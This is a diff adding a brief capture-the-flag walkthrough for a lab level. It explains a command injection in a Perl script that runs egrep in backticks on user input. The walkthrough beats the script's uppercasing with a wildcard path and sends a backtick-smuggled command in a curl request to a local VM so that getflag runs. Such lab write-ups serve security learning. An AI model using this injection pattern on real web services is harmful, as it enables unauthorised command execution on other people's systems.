@@ -1,0 +1,18 @@
+1. cat level12.pl
+We notice that there is a shell command executed via:
+@output = `egrep "^$xx" /tmp/xd 2>&1`
+
+So if we manage to make the program execute a script via $xx, we can make it!
+
+2. We notice that the x parameter, recovered via the $xx variable, is firts capitalize, and then its spaces are withdrawn.
+Hence if we pass to it  /tmp/SCRIPT for exec, it would transform the path into /TMP/SCRIPT and in the egrep command, it won't find it.
+
+3. we can use the * shell operator so that it will find /*/SCRIPT!
+
+4. Hence we build the following script: vim /tmp/SCRIPT 
+getflag > /tmp/flag
+
+5. With curl, we send a http request to the port 4646 of our VM with the x parameter as the execution of the script:
+curl http://localhost:4646/?x="\`/*/SCRIPT\`"
+
+6. then cat /tmp/flag => we get the flag!
